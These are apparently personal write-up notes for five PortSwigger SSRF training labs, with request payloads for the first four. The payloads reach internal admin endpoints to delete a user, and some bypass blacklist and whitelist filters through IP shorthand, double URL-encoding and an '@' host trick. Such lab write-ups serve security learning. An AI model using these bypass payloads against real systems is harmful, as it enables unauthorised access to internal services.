# 1. Lab: [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

```bash
stockApi=http://127.0.0.1/admin/delete?username=carlos
```

# 2. Lab: [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system\)

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.
in intruder scan:

```bash
stockApi=http%3A%2F%2F192.168.0.ยง1ยง%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
```

in repairer:

```bash
stockApi=http://192.168.0.76:8080/admin/delete?username=carlos
```

# 3. Lab: [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

```bash
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

# 4. Lab: [SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed an anti-SSRF defense you will need to bypass.

address:

```bash
http://localhost/admin
```

limitation:

```bash
"External stock check host must be stock.weliketoshop.net"
```

payload:

```json
stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

# 5. Lab: [SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.
